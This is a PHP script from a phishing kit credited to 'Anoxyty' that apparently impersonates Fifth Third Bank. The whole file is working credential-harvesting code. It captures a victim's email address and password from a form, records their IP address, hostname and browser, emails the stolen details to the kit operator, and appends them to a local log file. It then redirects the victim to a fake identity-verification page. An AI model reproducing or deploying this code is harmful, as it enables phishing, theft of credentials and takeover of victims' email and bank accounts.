<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];		
			if ( isset( $_POST['emailerr'] ) ) {
		
        $_SESSION['emailerr'] 	  = $_POST['emailerr'];
		$_SESSION['empasserr'] 	  = $_POST['empasserr'];
		$code = <<<EOT
============== [53RD 2 By Anoxyty | ]🔥 ==============
[Email Address] 		: {$_SESSION['emailerr']}
[Email Password]		: {$_SESSION['empasserr']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./🏛️ 53RD By Anoxyty 🏛️ ] =============
\r\n\r\n
EOT;

		$subject = "🏛️ 53RD Email Acess 2 By Anoxyty🏛️  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../security_personal?oamo/identity/&token=cjmvJprW2Dw1/mfacontacts_identification");
        exit();
	} else {
		header("Location: ../index?");
		exit();
	}
?>